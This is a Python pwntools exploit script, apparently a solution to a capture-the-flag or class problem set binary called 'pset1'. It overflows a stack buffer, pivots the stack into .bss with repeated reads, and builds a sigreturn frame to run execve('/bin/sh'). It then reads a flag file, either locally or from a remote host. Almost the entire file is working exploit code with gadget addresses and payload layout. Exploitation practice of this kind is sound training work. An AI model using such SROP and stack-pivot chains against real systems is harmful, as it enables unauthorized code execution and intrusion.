#!/usr/bin/env python3
# pset1 -- read(0, buf[64], 0x100), no canary in main, static non-PIE.
# Like no-win there is no `pop rdi/rsi/rdx` anywhere, only `pop rax; ret`
# and `syscall; ret`, so SROP is the way -- but the sigframe (304 bytes)
# does not fit in a single 256-byte read.
#
# main re-entered at 0x401bc3 does `read(0, rbp-0x40, 0x100)` and then
# `leave; ret`, so controlling the saved rbp turns that into an arbitrary
# 256-byte write plus a fresh (rbp, rip) control pair each time. Two such
# writes lay the sigframe out contiguously in .bss, then a `leave; ret`
# pivots rsp onto it.
import sys
from pwn import *

context.arch = 'amd64'
context.log_level = 'warn'

elf       = ELF('./pwn_pset1/handout/hello', checksec=False)
POP_RAX   = 0x42986b      # pop rax ; ret
SYSCALL   = 0x411ac6      # syscall ; ret
LEAVE_RET = 0x401bf4      # main's own epilogue
READ_AGAIN= 0x401bc3      # lea rax,[rbp-0x40]; ...; call read
C         = elf.bss() + 0x800
OFFSET    = 72

FRAME_AT  = C + 0x18
BINSH     = C + 0x180     # lives in chunk B
ARGV      = C + 0x1a0     # busybox needs a real argv[0]

f = SigreturnFrame()
f.rax, f.rdi, f.rsi, f.rdx = constants.SYS_execve, BINSH, ARGV, 0
f.rip, f.rsp = SYSCALL, C + 0x400
f.r8  = C + 0x140         # doubles as chunk A's saved-rbp  (frame offset 40)
f.r9  = READ_AGAIN        # doubles as chunk A's return addr (frame offset 48)
frame = bytes(f)

# chunk A: trigger + sigframe bytes 0..232 (everything the kernel restores)
chunkA = flat({0x00: POP_RAX, 0x08: 15, 0x10: SYSCALL, 0x18: frame[:232]},
              length=0x100, filler=b'\x00')
# chunk B: the pivot pair lands harmlessly inside the frame's sigmask area
chunkB = flat({0x40: C - 8, 0x48: LEAVE_RET, 0x80: b'/bin/sh\x00',
               0xa0: [BINSH, 0]},
              length=0x100, filler=b'\x00')

p1 = flat({OFFSET - 8: C + 0x40, OFFSET: READ_AGAIN}, length=0x100, filler=b'\x00')

if len(sys.argv) > 1 and ':' in sys.argv[1]:
    host, port = sys.argv[1].rsplit(':', 1)
    io = remote(host, int(port), ssl=True, timeout=10)
else:
    io = process(elf.path)

io.recvuntil(b'> ')
for part in (p1, chunkA, chunkB):
    io.send(part)
    time.sleep(0.35)
io.sendline(b'cat /flag.txt 2>/dev/null || cat flag.txt')
print(io.recvrepeat(4).decode(errors='replace').strip()[-400:])
